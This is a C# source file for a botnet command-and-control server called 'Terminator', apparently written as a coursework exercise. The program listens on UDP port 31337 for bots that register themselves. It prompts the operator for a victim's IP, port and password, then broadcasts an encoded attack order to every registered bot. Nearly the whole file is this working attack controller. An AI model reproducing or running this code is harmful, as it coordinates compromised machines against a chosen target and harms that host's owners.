using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Server
{
    class Program
    {
        private static List<Tuple<System.Net.IPAddress, string>> BotsList = new List<Tuple<System.Net.IPAddress, string>>();

        public static void Main(string[] args)
        {
            Console.WriteLine("Command and control server Terminator active");
            Thread t = new Thread(() => {
                ListenToBots();
            });
            t.Start();
            Console.WriteLine("Hello dear user,If you wish to close the program at any time, write 'Exit' and press Enter");
            while (true)
            {
                Console.WriteLine("Enter Ip of victim");
                string Vip = Console.ReadLine();
                if (Vip.Equals("Exit"))
                    Environment.Exit(0);
                Console.WriteLine("Enter port of victim");
                string Vport = Console.ReadLine();
                if (Vport.Equals("Exit"))
                    Environment.Exit(0);
                Console.WriteLine("Enter password of victim");
                string Vpassword = Console.ReadLine();
                if (Vpassword.Equals("Exit"))
                    Environment.Exit(0);

                bool checkInput = CheckInput(Vip, Vport, Vpassword);
                if (checkInput)
                {
                    Console.WriteLine("attacking victim on IP " + Vip + ", port " + Vport + " with " + BotsList.Count + " bots");
                    BotActivate(Vip, Vport, Vpassword);
                }
                else
                {
                    Console.WriteLine("Illegal-Input");
                }
            }
        }

        private static bool CheckInput(string vip, string vport, string vpassword)
        {
            if (vport.Length > 5 || vport.Equals("") || vpassword.Equals("") || vpassword.Length > 6)
                return false;
            foreach (char c in vport)
            {
                if (c < '0' || c > '9')
                    return false;
            }

            foreach (char x in vpassword)
            {
                if (x < 'a' || x > 'z')
                    return false;
            }
            System.Net.IPAddress ipAddress = null;
            bool isValidIp = System.Net.IPAddress.TryParse(vip, out ipAddress); //need to check this 
            if (!isValidIp)
                return false;

            return true;
        }

        private static void BotActivate(string vip, string vport, string vpassword)
        {
            byte[] ipBytes = IPAddress.Parse(vip).GetAddressBytes(); //4 bytes
            byte[] portBytes = BitConverter.GetBytes(Convert.ToUInt16(vport)); //2 bytes
            byte[] passBytes = Encoding.ASCII.GetBytes(vpassword); //6 bytes
            byte[] nameBytes = Encoding.ASCII.GetBytes("Terminator                      ");
            byte[] finalMsg = ipBytes.Concat(portBytes).ToArray().Concat(passBytes).ToArray().Concat(nameBytes).ToArray();

            UdpClient udpSender = new UdpClient();
            foreach (Tuple<System.Net.IPAddress, string> tuple in BotsList)
            {
                IPEndPoint ipDestination = new IPEndPoint(tuple.Item1, Int32.Parse(tuple.Item2));
                //byte[] bytes = Encoding.ASCII.GetBytes(vip + "*" + vport + "*" + vpassword + "*" + "Terminator");
                udpSender.Send(finalMsg, finalMsg.Length, ipDestination);

            }
            /*
            UdpClient udpSender = new UdpClient();
            foreach(Tuple<System.Net.IPAddress, string> tuple in BotsList)
            {
                IPEndPoint ipDestination = new IPEndPoint(tuple.Item1, Int32.Parse(tuple.Item2));
                byte[] bytes = Encoding.ASCII.GetBytes(vip + "*" + vport + "*" + vpassword + "*" + "Terminator");
                udpSender.Send(bytes, bytes.Length, ipDestination);

            }
            */
        }

        private static void ListenToBots()
        {
            UdpClient udpListener = new UdpClient(31337);
            byte[] data = new byte[1024];
            IPEndPoint sender = new IPEndPoint(IPAddress.Any, 0);

            while (true)
            {
                // Console.WriteLine("newBot");
                data = udpListener.Receive(ref sender);
                Tuple<System.Net.IPAddress, string> Bot = Tuple.Create(sender.Address, Encoding.ASCII.GetString(data, 0, data.Length));
                if (!BotsList.Contains(Bot))
                {
                    BotsList.Add(Bot);
                }

            }
        }
    }
}